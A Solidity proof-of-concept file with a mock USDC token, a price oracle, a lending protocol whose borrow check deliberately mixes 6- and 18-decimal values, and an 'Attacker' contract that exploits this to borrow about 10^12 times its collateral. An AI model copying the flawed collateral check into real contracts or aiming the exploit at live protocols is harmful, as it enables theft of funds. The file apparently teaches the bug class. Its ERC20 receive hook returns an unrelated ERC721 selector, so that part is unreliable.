// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// Mock USDC Stablecoin with 6 decimals
contract StableCoin is ERC20 {
    constructor() ERC20("USD Coin", "USDC") {
        _mint(msg.sender, 1000000 * 10**decimals());
    }

    function decimals() public view virtual override returns (uint8) {
        return 6;
    }
}

// Simplified Oracle that returns the price for USDC with 18 decimals
contract Oracle {
    // Let's assume the price of 1 USDC is $1, represented with 18 decimals
    function getPrice() external pure returns (uint256) {
        return 1 * 10**18; // 1 USDC = 1 USD, with 18 decimals
    }
}

// Mock Lending Protocol
contract LendingProtocol {
    Oracle public oracle;
    StableCoin public stableCoin;

    mapping(address => uint256) public collateral;

    constructor(address _oracle, address _stableCoin) {
        oracle = Oracle(_oracle);
        stableCoin = StableCoin(_stableCoin);
    }

    // User provides collateral in USDC
    function provideCollateral(uint256 usdcAmount) external {
        stableCoin.transferFrom(msg.sender, address(this), usdcAmount);
        collateral[msg.sender] += usdcAmount;
    }

    // User borrows funds based on collateral, leveraging the oracle price
    function borrow(uint256 borrowAmount) external {
        uint256 collateralValueUSD = collateral[msg.sender] * oracle.getPrice() / (10**stableCoin.decimals());
        require(borrowAmount <= collateralValueUSD, "Not enough collateral");

        // ... Logic to lend the funds ...
        // For simplicity, we just mock this with an event
        emit Borrowed(msg.sender, borrowAmount);
    }

    event Borrowed(address borrower, uint256 borrowAmount);
}

// Attacker contract
contract Attacker {
    LendingProtocol public lendingProtocol;
    StableCoin public stableCoin;

    constructor(address _lendingProtocol, address _stableCoin) {
        lendingProtocol = LendingProtocol(_lendingProtocol);
        stableCoin = StableCoin(_stableCoin);
    }

    // Attack function that demonstrates the exploit
    function exploit() external {
        uint256 collateralAmount = stableCoin.balanceOf(address(this));
        stableCoin.approve(address(lendingProtocol), collateralAmount);

        // Provide collateral with the full balance held by the attacker
        lendingProtocol.provideCollateral(collateralAmount);

        // Exploit: attempt to borrow funds worth more than the collateral provided
        // Since the oracle returns value with 18 decimals instead of 6, the lending protocol
        // assumes the attacker has provided more collateral than they actually have.
        uint256 exploitBorrowAmount = collateralAmount * 10**(18 - stableCoin.decimals());
        lendingProtocol.borrow(exploitBorrowAmount);

        // If the exploit succeeds, the attacker has now borrowed funds worth more
        // than their actual collateral
    }

    // Allow this contract to receive ERC20 tokens (needed to receive the "borrowed" funds)
    function onERC20Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return bytes4(0x150b7a02);
    }

    // Function to receive ETH (when the borrowed asset is ETH)
    receive() external payable {}
}
